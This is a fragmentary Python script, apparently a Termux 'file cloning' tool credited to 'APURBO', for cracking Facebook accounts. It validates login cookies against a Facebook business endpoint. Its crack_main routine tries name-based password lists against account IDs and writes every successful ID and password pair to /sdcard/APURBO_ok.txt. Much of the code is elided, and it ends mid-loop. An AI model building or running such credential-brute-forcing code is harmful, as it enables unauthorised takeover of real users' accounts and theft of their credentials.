...
#----[pran links]-----
kkk = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}
...
{50*"-"}
 ...
 Ａｕｔｈｏｒ  ：  ＡＰＵＲＢＯ
 Ｇｉｔｈｕｂ  ：  ｍｒｐａｒａｄｏｘ４０４
 Ｆａｃｅｂｏｏｋ  ：  ａｐｕｒｂｏｓｈｏｒｋａｒ０
 Ｓｔａｔｕｓ  ：  Ｆｒｅｅ
 Ｔｏｏｌ  Ｔｙｐｅ  ：  Ｆｉｌｅ  Ｃｌｏｎｉｎｇ
 Ｖｅｒｓｉｏｎ  ：  ０．２．２
----------------------------------------------
 Ｎｏｔｅ：  Ｕｓｅ  Ｆｌｉｇｔ  Ｍｏｄｅ  ＯＮ／ＯＦｆ  Ｗｈｅｎ  Ｓｔａｒｔ  Ｃ
Ｍ
----------------------------------------------
{50*"-"}'''
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        os.system('clear')
                        exit('script is in up date / maintanance be patient ')
...
def login():
        ...
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"}, cookies = {"cookie":cookies})
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[APURBO] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[APURBO-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/APURBO_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/APURBO_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/APURBO' in datar:
        pass
else:
        for i in range(5000):
